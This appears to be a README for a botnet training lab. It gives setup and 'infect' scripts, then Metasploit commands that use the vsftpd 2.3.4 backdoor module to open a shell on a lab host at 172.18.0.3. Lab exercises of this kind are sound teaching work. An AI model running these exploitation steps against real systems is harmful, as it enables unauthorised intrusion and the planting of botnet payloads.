# Botnet Lab - Metasploit Exploitation Guide

## Usage

### 1. Start the lab
```bash
./scripts/setup.sh
```

### 2. Exploit the bots and deploy payloads
```bash
./scripts/infect.sh
```


### 3. Manual exploitation (alternative)

Start Metasploit on your host (Ubuntu VM):
```bash
msfconsole
```

Exploit a bot using the vsftpd 2.3.4 backdoor:
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.18.0.3
exploit
```

You now have a shell on the bot!
